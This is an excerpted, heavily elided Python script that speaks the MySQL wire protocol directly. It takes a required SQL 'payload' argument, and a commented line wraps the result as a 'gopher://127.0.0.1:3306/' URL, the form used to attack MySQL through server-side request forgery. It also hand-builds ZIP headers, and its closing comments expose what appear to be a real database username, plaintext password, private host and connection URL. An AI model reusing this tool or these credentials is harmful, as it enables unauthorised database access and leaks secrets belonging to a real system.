...
def create_zip(filename, content_size):
    ...
    cd_file_header = (
        b"\x50\x4b\x01\x02\x1e\x03\x0a\x00"
        + "\x00" * 12
        + filename_len_b
        + "\x00" * 16
        + filename
...
class Protocal:
    ...
    def __unpack(self, data):
        ...
        if len(data) - 4 != length[0]:
            print(
                "[-] packet parse error, except lengt {} but {}".format(
                    length[0], len(data)
                )
            )
            sys.exit(1)
    ...
    def encode_password(self, password, scramble):
        if password:
            ...
            token = self.xor_string(
                self.__sha1(scramble + self.__sha1(stage1_hash)), stage1_hash
            )
            return token
        else:
            return ""
...
parser.add_argument(
    "-t", "--target", dest="host", help="database host", default="127.0.0.1"
)
parser.add_argument(
    "-p", "--password", help="database password default null", default="3306"
)
parser.add_argument(
    "-P", "--payload", help="the sql you want to execute with out ';'", required=True
)
parser.add_argument("-v", "--verbose", help="dump details", action="store_true")
parser.add_argument(
    "-c", "--connect", help="connect your database", action="store_true"
)
...
if __name__ == "__main__":
    ...
    # print("\nPayload:")
    # print(" " * 5, "gopher://127.0.0.1:3306/A" + payload)

# python3.9 ./test1.py -u iotServer -p 8o2hm6hNQx4LZBKJ  -t 192.168.9.240 -d iot_server_new -P "select a,b,c from book" -c -v

# DATABASE_URL = 'mysql+pymysql://iotServer:8o2hm6hNQx4LZBKJ@192.168.9.240:3306/iot_server_new'

# python3.9 ./test1.py -u iotServer -p 8o2hm6hNQx4LZBKJ  -t 127.0.0.1 -d iot_server_new -P "select a,b,c from book" -c
